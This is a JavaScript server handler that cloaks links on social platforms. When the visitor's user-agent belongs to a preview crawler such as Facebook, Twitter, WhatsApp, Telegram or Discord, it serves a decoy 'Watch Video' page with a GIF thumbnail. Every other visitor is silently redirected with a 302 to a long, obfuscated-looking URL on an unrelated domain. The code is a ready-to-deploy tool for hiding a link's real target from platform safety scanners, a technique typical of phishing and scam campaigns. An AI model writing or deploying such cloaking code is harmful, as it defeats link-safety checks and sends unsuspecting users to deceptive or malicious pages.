export default function handler(req, res) {
  const destination =
    "https://racialburgerdiverse.com/a6g/Lmmhytfxfj6l58Iqt_/nwCmZ6O1pOlLauJi2MVO/aVG89PN8oTmLaqMlSv4x/wDCToQYHH16pVGrYNu2/fwN9M3w07NN_XApwB/UER/VqI_Ubgt_Abh4g_8k5d/5Rcl8gPwDi";

  const previewImage =
    "https://pub-be5d60d5acbb45f2aa7e2ecb9ed94e25.r2.dev/WhatsApp%20Image%202026-09-30%20at%203.07.27%20AM.gif";

  const ua = (req.headers["user-agent"] || "").toLowerCase();

  const crawlers = [
    "facebookexternalhit",
    "facebot",
    "twitterbot",
    "linkedinbot",
    "pinterest",
    "slackbot",
    "discordbot",
    "telegrambot",
    "whatsapp"
  ];

  const isCrawler = crawlers.some(bot => ua.includes(bot));

  if (isCrawler) {
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">

  <title>Watch Video</title>

  <meta property="og:title" content="Watch Video">
  <meta property="og:description" content="Watch this video">
  <meta property="og:image" content="${previewImage}">
  <meta property="og:image:type" content="image/gif">
  <meta property="og:type" content="website">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Watch Video">
  <meta name="twitter:description" content="Watch this video">
  <meta name="twitter:image" content="${previewImage}">
</head>
<body></body>
</html>`;

    res.status(200);
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Cache-Control", "no-store");
    return res.end(html);
  }

  // Normal visitors get a real HTTP 302
  res.status(302);
  res.setHeader("Location", destination);
  res.setHeader("Cache-Control", "no-store");
  return res.end();
}
